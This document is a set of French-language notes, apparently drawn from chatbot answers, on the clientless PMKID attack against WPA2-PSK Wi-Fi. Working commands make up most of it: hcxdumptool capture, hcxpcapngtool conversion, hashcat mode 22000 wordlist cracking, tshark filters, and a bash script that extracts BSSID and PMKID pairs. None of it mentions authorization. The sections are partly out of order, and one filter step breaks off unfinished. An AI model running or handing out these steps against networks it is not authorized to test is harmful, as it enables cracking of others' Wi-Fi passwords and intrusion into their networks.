
**Tester la présence de PMKID (clientless)**

- Utilise **hcxdumptool** : il peut « interroger » l’AP et récupérer PMKID/EAPOL sans attendre la reconnexion d’un client (flux connu comme PMKID attack workflow).
    
- Sauvegarder la capture en `.pcapng`. [GitHub+1](https://github.com/ZerBea/hcxdumptool?utm_source=chatgpt.com)
    

Exemple (schématique) :
###  (mettre interface en moniteur d'abord)
```bash
sudo airmon-ng start wlan0
```

#### lancer hcxdumptool sur l'interface monitor
```bash
sudo hcxdumptool -i wlan1 -w capture.pcapng --rds=2 --exitoneapol=1
```

`--rds=2` affiche les APs (incl. PMKID) pendant la capture ; `--exitoneapol=1` fait sortir le programme quand un PMKID est reçu. [Ubuntu Manpages](https://manpages.ubuntu.com/manpages/jammy/man1/hcxpcapngtool.1.html?utm_source=chatgpt.com)


### ## Convertir la capture en format Hashcat (22000)

Une fois `capture.pcapng` obtenue, convertis-la avec **hcxpcapngtool** (hcxtools) pour obtenir un fichier crackable par Hashcat :

```bash
hcxpcapngtool -o hash.hc22000 -E essidlist capture.pcapng
```

- `-o hash.hc22000` produit le fichier utilisable par Hashcat (`-m 22000`)
- `-E essidlist` génère la liste des SSID trouvés. [Knowledge Base (KB)+1](https://kb.offsec.nl/tools/hash-cracking/hcxtools/hcxpcapngtool/?utm_source=chatgpt.com)
    
Puis (exemple) :

```bash
hashcat -m 22000 hash.hc22000 wordlist.txt

```

- _(les options changent selon versions — vérifier `hcxdumptool -h` sur ta machine)._ [Ubuntu Manpages+1](https://manpages.ubuntu.com/manpages/noble/man1/hcxdumptool.1.html?utm_source=chatgpt.com)
    
- **Extraire/convertir le hash pour cracking**
    
    - Avec **hcxpcapngtool** (fourni par hcxtools) tu convertis la capture en format Hashcat (ex: `-o hash22000.hc22000` ou `--pmkid` selon version). Puis utiliser Hashcat (mode 22000) pour attaque hors-ligne. [Kali Linux+1](https://www.kali.org/tools/hcxtools/?utm_source=chatgpt.com)
        
    
    Schéma :
    
```bash
hcxpcapngtool -o hashcat.22000 capture.pcapng
hashcat -m 22000 hashcat.22000 wordlist.txt
```

# Comment savoir _où_ chercher (signes indiquant surface d’attaque)

- **AP en WPA2-PSK** (PSK = zone d’intérêt). Les infrastructures Enterprise (802.1X) réduisent l’intérêt du PMKID classique.
    
- **RSN IE présent dans les beacons/probe responses** : ouvre la trame dans Wireshark et lis l’IE (id 48) — il donne les suites de chiffrement et parfois des indicateurs liés au caching/roaming. [mrn-cciew+1](https://mrncciew.com/2014/08/21/cwsp-rsn-information-elements/?utm_source=chatgpt.com)
    
- **hcxdumptool retourne PMKID/EAPOL status** pendant la capture — c’est le signe direct qu’un PMKID a été reçu. [hashcat.net](https://hashcat.net/forum/thread-11913.html?utm_source=chatgpt.com)

Parfait — voici exactement **ce qu’il faut taper dans le champ de filtre d’affichage de Wireshark** et comment interpréter le résultat (en français, concis et pratique).

---

### 1) Filtre pour afficher **toutes** les trames qui contiennent l’élément RSN (RSN Information Element)

```bash
wlan_mgt.tag.number == 48
```

```bash
tshark -r capture.pcapng -Y "wlan.rsn.ie.pmkid" -T fields -e frame.number -e wlan.bssid -e wlan.rsn.ie.pmkid
```
## 3) Extraction propre et formatage (BSSID + PMKID sans séparateurs, prêt pour hcxpcapngtool si besoin)


```bash
tshark -r capture.pcapng -Y "wlan.rsn.ie.pmkid" -T fields -e wlan.bssid -e wlan.rsn.ie.pmkid \
  | awk '{ if($2!="") print $1":"$2 }'
```

L’IE RSN a l’ID **48** ; ce filtre liste les _Beacon / Probe Response / Association_ qui annoncent des paramètres RSN (AES/CCMP, AKM, etc.).

### 2) Filtre pour afficher les trames management qui **contiennent un PMKID**

```bash
wlan_mgt.rsn.ie.pmkid
```

ou, plus strict (si tu veux uniquement paquets où le PMKID existe) :


# Script bash

```bash
#!/bin/bash
PCAP="capture.pcapng"
OUT="pmkid_list.txt"
> "$OUT"

echo "[*] Recherche PMKID via wlan.rsn.ie.pmkid..."
tshark -r "$PCAP" -Y "wlan.rsn.ie.pmkid" -T fields -e wlan.bssid -e wlan.rsn.ie.pmkid \
  | awk '{ if($2!="") print $1":"$2 }' >> "$OUT"

echo "[*] Recherche via wlan.rsn.pmkid.list..."
tshark -r "$PCAP" -Y "wlan.rsn.pmkid.list" -T fields -e wlan.bssid -e wlan.rsn.pmkid.list \
  | awk '{ if($2!="") print $1":"$2 }' >> "$OUT"

echo "[*] Recherche verbose (fallback) pour PMKID dans IEs RSN..."
tshark -r "$PCAP" -Y "wlan_mgt.tag.number == 48" -V | grep -i -n "pmkid" >> "$OUT"

if [ -s "$OUT" ]; then
  echo "[+] PMKID trouvé — résultats dans $OUT"
  sort -u "$OUT"
else
  echo "[-] Aucun PMKID détecté dans $PCAP"
fi
```

